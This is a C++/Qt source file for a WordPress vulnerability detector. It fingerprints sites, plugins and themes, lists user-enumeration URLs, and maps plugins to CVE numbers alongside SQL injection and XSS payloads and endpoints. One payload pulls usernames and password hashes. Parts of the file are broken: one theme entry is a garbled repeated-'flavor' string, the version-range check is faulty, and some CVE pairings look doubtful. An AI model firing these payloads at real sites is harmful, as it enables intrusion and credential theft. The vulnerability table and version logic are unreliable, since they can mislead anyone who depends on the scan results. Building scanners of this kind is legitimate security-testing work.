#include "wpvulndetector.h"
#include <QRegularExpression>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>

namespace {

const QStringList wpIndicators = {
    QStringLiteral("wp-content"),
    QStringLiteral("wp-includes"),
    QStringLiteral("wp-admin"),
    QStringLiteral("wp-json"),
    QStringLiteral("wordpress"),
    QStringLiteral("wp-login.php"),
    QStringLiteral("xmlrpc.php"),
    QStringLiteral("wp-cron.php")
};

const QStringList loginIndicators = {
    QStringLiteral("wp-login.php"),
    QStringLiteral("loginform"),
    QStringLiteral("user_login"),
    QStringLiteral("user_pass"),
    QStringLiteral("wp-submit"),
    QStringLiteral("Log In"),
    QStringLiteral("Lost your password?"),
    QStringLiteral("Remember Me")
};

const QStringList adminIndicators = {
    QStringLiteral("wp-admin"),
    QStringLiteral("adminmenu"),
    QStringLiteral("Dashboard"),
    QStringLiteral("adminbar"),
    QStringLiteral("wp-admin-bar"),
    QStringLiteral("update-nag")
};

const QStringList userEnumPayloads = {
    QStringLiteral("/?author=1"),
    QStringLiteral("/?author=2"),
    QStringLiteral("/?author=3"),
    QStringLiteral("/wp-json/wp/v2/users"),
    QStringLiteral("/wp-json/wp/v2/users?per_page=100"),
    QStringLiteral("/?rest_route=/wp/v2/users"),
    QStringLiteral("/feed/rss2/"),
    QStringLiteral("/xmlrpc.php")
};

struct KnownVuln {
    QString plugin;
    QString minVersion;
    QString maxVersion;
    WpVulnDetector::VulnType type;
    QString cve;
    QString description;
    QString payload;
    QString endpoint;
    int severity;
};

const QList<KnownVuln> knownVulnerabilities = {
    {QStringLiteral("jetpack"), QStringLiteral("0.0.0"), QStringLiteral("9.8"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2021-24881"),
     QStringLiteral("Jetpack SQL Injection via search parameter"),
     QStringLiteral("' OR 1=1--"), QStringLiteral("/wp-json/jetpack/v4/search"), 3},

    {QStringLiteral("all-video-gallery"), QStringLiteral("0.0.0"), QStringLiteral("1.1"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2012-6651"),
     QStringLiteral("All Video Gallery SQL Injection"),
     QStringLiteral("1 UNION SELECT 1,2,3,4,5--"), QStringLiteral("/wp-content/plugins/all-video-gallery/"), 4},

    {QStringLiteral("wp-statistics"), QStringLiteral("0.0.0"), QStringLiteral("13.0.7"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2021-24340"),
     QStringLiteral("WP Statistics Time-based SQL Injection"),
     QStringLiteral("') OR SLEEP(5)--"), QStringLiteral("/wp-admin/admin.php?page=wps_pages_page"), 3},

    {QStringLiteral("theme-flavor-flavor-flavor-flavor-flavor-flavor-flavor-flavor-flavor-flavor-flavor-flavor-flavor-flavor-flavor"), QStringLiteral("0.0.0"), QStringLiteral("9.9.9"),
     WpVulnDetector::VulnType::Xss, QStringLiteral("CVE-2021-24123"),
     QStringLiteral("Theme XSS vulnerability"),
     QStringLiteral("<script>alert(1)</script>"), QStringLiteral("/"), 2},

    {QStringLiteral("nex-forms"), QStringLiteral("0.0.0"), QStringLiteral("3.0"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2015-9414"),
     QStringLiteral("NEX-Forms SQL Injection"),
     QStringLiteral("1' AND 1=1--"), QStringLiteral("/wp-admin/admin-ajax.php?action=nex_forms_ajax"), 4},

    {QStringLiteral("smart-google-code-inserter"), QStringLiteral("0.0.0"), QStringLiteral("3.5"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2018-3810"),
     QStringLiteral("Smart Google Code Inserter SQL Injection"),
     QStringLiteral("1' UNION SELECT 1,2,3--"), QStringLiteral("/wp-admin/admin-ajax.php"), 4},

    {QStringLiteral("zotpress"), QStringLiteral("0.0.0"), QStringLiteral("4.4"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2015-8354"),
     QStringLiteral("Zotpress SQL Injection"),
     QStringLiteral("1 OR 1=1--"), QStringLiteral("/wp-content/plugins/zotpress/lib/"), 3},

    {QStringLiteral("league-manager"), QStringLiteral("0.0.0"), QStringLiteral("3.8"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2015-1579"),
     QStringLiteral("League Manager SQL Injection"),
     QStringLiteral("' UNION SELECT 1,2,3,4,5--"), QStringLiteral("/wp-content/plugins/leaguemanager/"), 4},

    {QStringLiteral("wp-support-plus-responsive-ticket-system"), QStringLiteral("0.0.0"), QStringLiteral("8.0.7"),
     WpVulnDetector::VulnType::PrivilegeEscalation, QStringLiteral("CVE-2017-18570"),
     QStringLiteral("WP Support Plus Privilege Escalation"),
     QStringLiteral("action=wpsp_editTicket&ticket_id=1"), QStringLiteral("/wp-admin/admin-ajax.php"), 4},

    {QStringLiteral("wp-fastest-cache"), QStringLiteral("0.0.0"), QStringLiteral("0.8.4.8"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2021-24869"),
     QStringLiteral("WP Fastest Cache SQL Injection"),
     QStringLiteral("1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"), QStringLiteral("/wp-admin/admin.php"), 3},

    {QStringLiteral("link-library"), QStringLiteral("0.0.0"), QStringLiteral("5.2.1"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2013-2701"),
     QStringLiteral("Link Library SQL Injection"),
     QStringLiteral("' OR '1'='1"), QStringLiteral("/wp-content/plugins/link-library/"), 3},

    {QStringLiteral("jtrt-responsive-tables"), QStringLiteral("0.0.0"), QStringLiteral("4.1"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2014-4592"),
     QStringLiteral("JTRT Responsive Tables SQL Injection"),
     QStringLiteral("1 UNION ALL SELECT NULL--"), QStringLiteral("/wp-content/plugins/jtrt-responsive-tables/"), 3},

    {QStringLiteral("hitasoft-player-ripehd-flv-player"), QStringLiteral("0.0.0"), QStringLiteral("1.0"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2015-2065"),
     QStringLiteral("Hitasoft Player SQL Injection"),
     QStringLiteral("1' OR '1'='1'--"), QStringLiteral("/wp-content/plugins/player-developer/"), 4},

    {QStringLiteral("google-document-embedder"), QStringLiteral("2.5.14"), QStringLiteral("2.5.16"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2012-4915"),
     QStringLiteral("Google Document Embedder SQL Injection"),
     QStringLiteral("-1 UNION SELECT 1,2,3,4--"), QStringLiteral("/wp-content/plugins/google-document-embedder/"), 4},

    {QStringLiteral("glossary"), QStringLiteral("0.0.0"), QStringLiteral("3.1.2"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2015-9305"),
     QStringLiteral("Glossary Plugin SQL Injection"),
     QStringLiteral("' AND 1=1--"), QStringLiteral("/wp-admin/admin-ajax.php?action=glossary"), 3},

    {QStringLiteral("facebook-promotions"), QStringLiteral("0.0.0"), QStringLiteral("1.3.3"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2014-8800"),
     QStringLiteral("Facebook Promotions SQL Injection"),
     QStringLiteral("1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"), QStringLiteral("/wp-content/plugins/facebook-promotions/"), 4},

    {QStringLiteral("event-registration"), QStringLiteral("0.0.0"), QStringLiteral("5.4.3"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2014-5199"),
     QStringLiteral("Event Registration SQL Injection"),
     QStringLiteral("1 OR 1=1--"), QStringLiteral("/wp-admin/admin-ajax.php?action=event_registration"), 3},

    {QStringLiteral("cp-multi-view-event-calendar"), QStringLiteral("0.0.0"), QStringLiteral("1.17"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2015-2196"),
     QStringLiteral("CP Multi View Event Calendar SQL Injection"),
     QStringLiteral("-1 UNION SELECT 1,CONCAT(user_login,0x3a,user_pass)--"), QStringLiteral("/"), 4},

    {QStringLiteral("easy-contact-form-lite"), QStringLiteral("0.0.0"), QStringLiteral("1.0.7"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2014-4940"),
     QStringLiteral("Easy Contact Form Lite SQL Injection"),
     QStringLiteral("' AND 1=0 UNION SELECT 1,2,3,4,5--"), QStringLiteral("/wp-content/plugins/easy-contact-form-lite/"), 3},

    {QStringLiteral("bannerize"), QStringLiteral("0.0.0"), QStringLiteral("2.8.7"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2014-9443"),
     QStringLiteral("Bannerize SQL Injection"),
     QStringLiteral("1' ORDER BY 1--"), QStringLiteral("/wp-content/plugins/bannerize/"), 3},

    {QStringLiteral("yolink-search"), QStringLiteral("0.0.0"), QStringLiteral("1.1.4"),
     WpVulnDetector::VulnType::SqlInjection, QStringLiteral("CVE-2014-4558"),
     QStringLiteral("Yolink Search SQL Injection"),
     QStringLiteral("1'--"), QStringLiteral("/wp-content/plugins/yolink-search/"), 3}
};

bool compareVersions(const QString &version, const QString &min, const QString &max) {
    QStringList vParts = version.split(QLatin1Char('.'));
    QStringList minParts = min.split(QLatin1Char('.'));
    QStringList maxParts = max.split(QLatin1Char('.'));

    auto toInt = [](const QStringList &parts, int index) -> int {
        if (index < parts.size()) {
            bool ok;
            int val = parts[index].toInt(&ok);
            return ok ? val : 0;
        }
        return 0;
    };

    for (int i = 0; i < 3; ++i) {
        int v = toInt(vParts, i);
        int mi = toInt(minParts, i);
        int ma = toInt(maxParts, i);

        if (v < mi) return false;
        if (v > ma) return false;
    }

    return true;
}

} // anonymous namespace


bool WpVulnDetector::isWordPress(const QString &responseBody) const
{
    for (const QString &indicator : wpIndicators) {
        if (responseBody.contains(indicator, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

QString WpVulnDetector::detectVersion(const QString &responseBody) const
{
    QRegularExpression metaRe(QStringLiteral("<meta[^>]*name=[\"']generator[\"'][^>]*content=[\"']WordPress ([\\d.]+)[\"']"),
                              QRegularExpression::CaseInsensitiveOption);
    QRegularExpressionMatch match = metaRe.match(responseBody);
    if (match.hasMatch()) {
        return match.captured(1);
    }

    QRegularExpression feedRe(QStringLiteral("<generator>https?://wordpress\\.org/\\?v=([\\d.]+)</generator>"),
                              QRegularExpression::CaseInsensitiveOption);
    match = feedRe.match(responseBody);
    if (match.hasMatch()) {
        return match.captured(1);
    }

    QRegularExpression cssRe(QStringLiteral("wp-includes/css/[^?]*\\?ver=([\\d.]+)"),
                             QRegularExpression::CaseInsensitiveOption);
    match = cssRe.match(responseBody);
    if (match.hasMatch()) {
        return match.captured(1);
    }

    return QString();
}

QStringList WpVulnDetector::detectPlugins(const QString &responseBody) const
{
    QStringList plugins;

    QRegularExpression pluginRe(QStringLiteral("/wp-content/plugins/([^/\"']+)/"),
                                QRegularExpression::CaseInsensitiveOption);
    QRegularExpressionMatchIterator it = pluginRe.globalMatch(responseBody);

    while (it.hasNext()) {
        QRegularExpressionMatch match = it.next();
        QString plugin = match.captured(1);
        if (!plugins.contains(plugin)) {
            plugins.append(plugin);
        }
    }

    return plugins;
}

QStringList WpVulnDetector::detectThemes(const QString &responseBody) const
{
    QStringList themes;

    QRegularExpression themeRe(QStringLiteral("/wp-content/themes/([^/\"']+)/"),
                               QRegularExpression::CaseInsensitiveOption);
    QRegularExpressionMatchIterator it = themeRe.globalMatch(responseBody);

    while (it.hasNext()) {
        QRegularExpressionMatch match = it.next();
        QString theme = match.captured(1);
        if (!themes.contains(theme)) {
            themes.append(theme);
        }
    }

    return themes;
}

QList<WpVulnDetector::Vulnerability> WpVulnDetector::getKnownVulnerabilities(const QString &plugin,
                                                                              const QString &version) const
{
    QList<Vulnerability> vulns;

    for (const auto &known : knownVulnerabilities) {
        if (known.plugin.compare(plugin, Qt::CaseInsensitive) == 0) {
            if (version.isEmpty() || compareVersions(version, known.minVersion, known.maxVersion)) {
                Vulnerability v;
                v.plugin = known.plugin;
                v.version = version;
                v.type = known.type;
                v.cve = known.cve;
                v.description = known.description;
                v.payload = known.payload;
                v.endpoint = known.endpoint;
                v.severity = known.severity;
                vulns.append(v);
            }
        }
    }

    return vulns;
}

QStringList WpVulnDetector::getLoginPageIndicators()
{
    return loginIndicators;
}

QStringList WpVulnDetector::getAdminPageIndicators()
{
    return adminIndicators;
}

QStringList WpVulnDetector::getUserEnumPayloads()
{
    return userEnumPayloads;
}

QString WpVulnDetector::typeName(VulnType type)
{
    switch (type) {
    case VulnType::SqlInjection: return QStringLiteral("SQL Injection");
    case VulnType::Xss: return QStringLiteral("Cross-Site Scripting");
    case VulnType::Rce: return QStringLiteral("Remote Code Execution");
    case VulnType::Lfi: return QStringLiteral("Local File Inclusion");
    case VulnType::Rfi: return QStringLiteral("Remote File Inclusion");
    case VulnType::AuthBypass: return QStringLiteral("Authentication Bypass");
    case VulnType::PrivilegeEscalation: return QStringLiteral("Privilege Escalation");
    case VulnType::InformationDisclosure: return QStringLiteral("Information Disclosure");
    case VulnType::ArbitraryFileUpload: return QStringLiteral("Arbitrary File Upload");
    case VulnType::Csrf: return QStringLiteral("Cross-Site Request Forgery");
    default: return QStringLiteral("Unknown");
    }
}
